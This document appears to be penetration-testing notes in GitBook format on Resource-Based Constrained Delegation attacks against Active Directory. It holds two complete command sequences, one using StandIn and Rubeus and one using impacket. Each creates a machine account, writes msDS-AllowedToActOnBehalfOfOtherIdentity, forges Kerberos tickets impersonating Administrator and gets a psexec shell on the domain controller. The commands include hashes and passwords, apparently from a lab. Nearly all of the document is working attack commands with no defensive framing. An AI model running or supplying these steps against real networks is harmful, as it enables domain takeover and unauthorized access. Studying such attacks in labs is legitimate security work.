# Resource-Based Constrained Delegation

## Method 1

```
# Upload
upload StandIn.exe
upload Rubeus.exe
 
# Create machine account
.\StandIn.exe --computer adam --make
Get-ADComputer -Filter * | Select-Object Name, SID
 
# Write msDS-AllowedToActOnBehalfOfOtherIdentity
.\StandIn.exe --computer ResourceDC --sid S-1-5-21-537427935-490066102-1511301751-4101

# Get Hash
.\Rubeus.exe hash /password:CXmmf6iesgcIpwV /user:adam$ /domain:resourced.local
 
# Impersonate Administrator
.\Rubeus.exe s4u /user:adam /rc4:E1A3DB48A04C4CC148FB5AA8643E7AF0 /impersonateuser:administrator /msdsspn:cifs/resourcedc.resourced.local /nowrap /ptt

# Convert Ticket & PSExec with Kerberos (on Kali)
cat ticket.b64 | base64 -d > ticket.kirbi
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=`pwd`/ticket.ccache
klist
impacket-psexec -k -no-pass resourced.local/administrator@resourcedc.resourced.local -dc-ip 192.168.114.175

```

## Method 2

```
# Create machine account
impacket-addcomputer -computer-name adam -computer-pass P@ssw0rd123 -dc-ip 192.168.131.175 resourced.local/L.Livingstone -hashes :19a3a7550ce8c505c2d46b5e39d6f808

# Write msDS-AllowedToActOnBehalfOfOtherIdentity
./rbcd.py -dc-ip 192.168.131.175 -t RESOURCEDC -f 'adam' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone

# Impersonate Administrator
impacket-getST -spn cifs/resourcedc.resourced.local resourced/adam\$:'P@ssw0rd123' -impersonate Administrator -dc-ip 192.168.131.175

# PSExec with Kerberos (on Kali)
export KRB5CCNAME=./Administrator.ccache
impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.131.175
```

{% code overflow="wrap" %}
```
python3 rbcd.py -action write -delegate-to "DC01$" -delegate-from "EVILCOMPUTER$" -dc-ip 10.10.10.1 -hashes :A9FDFA038C4B75EBC76DC855DD74F0DA test.local/john
```
{% endcode %}
